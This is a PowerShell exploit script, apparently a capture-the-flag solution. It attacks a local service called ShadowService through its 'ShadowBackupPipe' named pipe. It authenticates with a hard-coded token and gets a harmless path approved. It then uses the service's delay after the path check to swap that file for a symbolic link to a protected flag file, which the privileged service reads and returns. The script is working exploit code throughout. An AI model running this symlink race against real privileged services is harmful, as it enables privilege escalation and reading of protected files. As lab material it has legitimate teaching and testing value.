param(
    [Parameter(Mandatory = $false)]
    [string]$FlagPath
)

$ErrorActionPreference = "Stop"
Set-StrictMode -Version 2

function Find-FlagPath {
    $process = Get-CimInstance Win32_Process -Filter "Name = 'ShadowService.exe'" |
        Select-Object -First 1

    if ($null -ne $process -and $process.ExecutablePath) {
        return Join-Path (Split-Path -Parent $process.ExecutablePath) "ProtectedSandboxFlag.txt"
    }

    if (Test-Path -LiteralPath ".\ShadowService.exe") {
        $serviceExe = (Get-Item -LiteralPath ".\ShadowService.exe").FullName
        return Join-Path (Split-Path -Parent $serviceExe) "ProtectedSandboxFlag.txt"
    }

    throw "Could not locate ShadowService.exe. Pass -FlagPath with the full path to ProtectedSandboxFlag.txt."
}

if (-not $FlagPath) {
    $FlagPath = Find-FlagPath
}

$raceDirectory = Join-Path $env:TEMP ("shadow-race-" + [Guid]::NewGuid().ToString("N"))
$safeTarget = Join-Path $raceDirectory "safe.txt"
$approvedPath = Join-Path $raceDirectory "allowed.txt"
$probeLink = Join-Path $raceDirectory "link-test.txt"
$pipe = $null
$reader = $null
$writer = $null

try {
    New-Item -ItemType Directory -Path $raceDirectory | Out-Null
    Set-Content -LiteralPath $safeTarget -Value "benign" -NoNewline

    # Confirm that this account can create a file symlink before starting the race.
    try {
        New-Item -ItemType SymbolicLink -Path $probeLink -Target $safeTarget | Out-Null
        Remove-Item -LiteralPath $probeLink -Force
    }
    catch {
        throw "File symlink creation failed. Enable Windows Developer Mode or run in a context with SeCreateSymbolicLinkPrivilege. $($_.Exception.Message)"
    }

    Set-Content -LiteralPath $approvedPath -Value "benign" -NoNewline

    $pipe = [System.IO.Pipes.NamedPipeClientStream]::new(
        ".",
        "ShadowBackupPipe",
        [System.IO.Pipes.PipeDirection]::InOut
    )
    $pipe.Connect(5000)
    $reader = [System.IO.StreamReader]::new($pipe)
    $writer = [System.IO.StreamWriter]::new($pipe)
    $writer.AutoFlush = $true

    $writer.WriteLine("AUTH ShadowBackup_SecretToken_2026!")
    $authReply = $reader.ReadLine()
    if ($authReply -ne "OK: Authenticated.") {
        throw "Authentication failed: $authReply"
    }

    # The basename exception lets this absolute, user-controlled path pass validation.
    $writer.WriteLine("GET $approvedPath")
    $validationReply = $reader.ReadLine()
    if ($validationReply -ne "OK: Processing...") {
        throw "The path was not accepted: $validationReply"
    }

    # The service is now sleeping for 2.5 seconds after checking the lexical path.
    Remove-Item -LiteralPath $approvedPath -Force
    New-Item -ItemType SymbolicLink -Path $approvedPath -Target $FlagPath | Out-Null

    $readReply = $reader.ReadLine()
    if ($null -eq $readReply -or -not $readReply.StartsWith("OK:")) {
        throw "The privileged read failed: $readReply"
    }

    $flag = $readReply.Substring(3)
    Write-Output $flag
}
finally {
    if ($null -ne $writer) { $writer.Dispose() }
    if ($null -ne $reader) { $reader.Dispose() }
    if ($null -ne $pipe) { $pipe.Dispose() }

    Remove-Item -LiteralPath $probeLink -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $approvedPath -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $safeTarget -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $raceDirectory -Force -ErrorAction SilentlyContinue
}
